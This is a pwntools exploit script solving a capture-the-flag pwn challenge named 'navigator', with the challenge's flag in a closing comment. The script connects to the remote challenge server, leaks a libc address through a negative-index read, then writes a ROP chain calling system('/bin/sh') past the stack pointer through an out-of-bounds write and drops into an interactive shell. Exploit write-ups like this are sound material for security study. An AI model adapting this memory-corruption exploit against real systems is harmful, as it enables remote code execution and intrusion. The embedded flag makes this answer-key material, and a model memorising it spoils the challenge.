from pwn import *

bin = './navigator'
elf = context.binary = ELF(bin)
libc = elf.libc

#p = process(bin)
p = remote('chal.competitivecyber.club', 8887)
#gdb.attach(p, 'b *main+250')

def view(offset):
    string = b''
    for i in range(8):
        p.sendlineafter(b'>>', b'2')
        p.sendlineafter(b'index >>', str(-(offset-i)).encode())
        p.recvuntil(b'Pin:\n')
        string += p.recvuntil(b'\n', drop=True)
    
    return string

def write(offset, payload):
    for i in range(8):
        p.sendlineafter(b'>>', b'1')
        p.sendlineafter(b'index >>', str(offset+i).encode())
        p.sendlineafter(b'character >>', chr(payload[i]))

#Leaking LIBC
libc.address = (u64(view(136)) - 0x43654)
log.info(hex(libc.address))

#Overwriting RSP to get RCE!!!!! 344 is RSP
rop = ROP(libc)
rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
write(344, p64(rdi))
write(344+8, p64(next(libc.search(b'/bin/sh\x00'))))
write(344+16, p64(rdi+1))
write(344+24, p64(libc.sym['system']))
p.sendlineafter(b'>>', b'3')
p.interactive()

#pctf{th4t_w45_ann0ying_014d0a7cb3d}